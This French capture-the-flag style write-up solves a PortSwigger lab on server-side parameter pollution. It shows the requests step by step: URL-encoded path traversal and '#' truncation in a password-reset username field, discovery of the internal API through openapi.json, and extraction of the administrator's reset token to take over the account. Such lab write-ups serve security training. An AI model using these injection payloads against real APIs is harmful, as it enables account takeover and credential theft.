# Lab

https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url

## Solution

Sur ce lab on a pas beaucoup de possibilité, mis à part le fait de pouvoir reset le password d'un utilisateur.

Cette fonctionnalité demande un username et envoie un mail de réinitialisation de mot de passe.

```http
POST /forgot-password HTTP/2
Host: 0afa005c032cd80f84cb05140034001e.web-security-academy.net
Cookie: session=yitoj60piwqjrtGN2UCyzxk211GBo4JE
Content-Length: 88
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Content-Type: x-www-form-urlencoded
Accept: */*
Origin: https://0afa005c032cd80f84cb05140034001e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0afa005c032cd80f84cb05140034001e.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

csrf=ODhGHgRmNlvlnW3SY55CuFo4kvHpRO2G&username=administrator
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"type":"email","result":"*****@normal-user.net"}
```

Si on essaie de tronquer la saisie avec un `#` encodé en URL, on obtient une erreur.

```http
username=administrator%23

{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

Ce qui nous indique qu'il y a bien une partie de l'URL qui est ajouté à la fin de la requête.

On peut essayer de remonter les répertoires avec des `../` encodés en URL.

```http
username=../../../%23

{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

Jusqu'à `../../../../` où on obtient une erreur différente.

```http
username=../../../../%23

{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```

Ce qui nous indique qu'on est sorti du répertoire de l'API.

On peut essayer de chercher des documentations d'API puisqu'un des messages nou indiquait `Please refer to the API definition` :

- `swagger.json`
- `openapi.json`
- `api.json`

```http
username=../../../../api.json%23

{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```

```http
username=../../../../swagger.json%23

{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```

```http
username=../../../../openapi.json%23

{
  "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}
```

On a un resultat avec `openapi.json` qui nous donne la documentation de l'API.

On y découvre la vraie URL de l'API : `/api/internal/v1/users/{username}/field/{field}`

En reprenant notre requête de départ, on peut essayer de modifier le chemin de l'URL.

```http
username=administrator/field/email%23

{"type":"email","result":"*****@normal-user.net"}
```

Bêtement, on peut essayer d'accéder au mot de passe ou au token de reset du mot de passe, mais ça ne fonctionne pas.

```http
username=administrator/field/password%23

{
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}
```

Le message nous indique que `cette version` supporte uniquement le champ `email` pour des raisons de sécurité, ce qui veut dire qu'il y a une autre version.

Sur la documentation de l'API, on peut voir qu'il y a une version `2.0.0`, on peut essayer d'y accéder en modifiant notre requête :

```http
username=../../../../api/internal/v1/users/administrator/field/email%23

{"type":"email","result":"*****@normal-user.net"}
```

Avec `password` on a une erreur :

```http
username=../../../../api/internal/v1/users/administrator/field/password%23

{
  "type": "error",
  "result": "The provided field name \"password\" does not exist and cannot be retrieved"
}
```

En fouillant dans les requêtes faites par l'appli web, on trouve un fichier `/static/js/forgotPassword.js` contenant cette fonction nous donnant des informations sur le token de reset de mot de passe :

```javascript
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```

On y découvre un nom de paramètre `passwordResetToken` qui est utilisé pour la réinitialisation du mot de passe.

Si on essaie de l'utiliser dans notre requête :

```http
username=../../../../api/internal/v1/users/administrator/field/passwordResetToken%23

{
  "type": "passwordResetToken",
  "result": "l0cvd4iwmxtfq8dwnncc8mnwrlkuejeh"
}
```

On obtient ce token qui nous permet d'accéder à `/forgot-password?reset-token=l0cvd4iwmxtfq8dwnncc8mnwrlkuejeh` et de réinitialiser le mot de passe de l'utilisateur `administrator`.